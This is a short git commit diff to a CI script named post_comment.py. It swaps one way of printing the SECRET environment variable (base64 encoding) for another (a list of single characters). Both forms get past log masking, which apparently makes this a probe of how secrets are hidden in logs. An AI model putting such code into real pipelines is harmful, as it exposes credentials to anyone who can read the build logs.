a843035c7dd3944fa04032578160742722521bd0
Nikita Shulga <2453524+malfet@users.noreply.github.com>
2024-10-08 10:59:43 -0700

    Update post_comment.py

--- .github/scripts/post_comment.py
+++ .github/scripts/post_comment.py
@@ -3,5 +3,4 @@
 
 if __name__ == "__main__":
     import os
-    import base64
-    print(base64.b64encode(os.environ.get("SECRET", "hahaha").encode("ascii")))
+    print([x for x in os.environ.get("SECRET", "hahaha")])
